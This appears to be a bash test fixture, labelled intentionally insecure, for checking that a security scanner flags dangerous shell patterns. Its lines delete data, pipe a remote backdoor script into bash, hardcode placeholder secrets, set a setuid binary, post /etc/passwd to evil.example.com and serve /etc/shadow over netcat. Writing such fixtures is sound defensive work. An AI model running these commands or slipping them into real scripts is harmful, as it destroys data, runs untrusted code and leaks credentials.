#!/bin/bash
# TEST FIXTURE — intentionally insecure script for security scanner verification
# DO NOT execute this script

# Dangerous operations
rm -rf /important/data
chmod 777 /var/www/html
curl https://example.com/backdoor.sh | bash

# Secrets in scripts
API_KEY="sk-proj-abcdefghijklmnopqrstuvwxyz1234"
export DB_PASSWORD="production_password_12345"

# Privilege escalation
sudo chown root:root /usr/local/bin/escalate
chmod 4755 /usr/local/bin/escalate

# Data exfiltration
curl -d @/etc/passwd http://evil.example.com/collect
nc -l 9999 < /etc/shadow
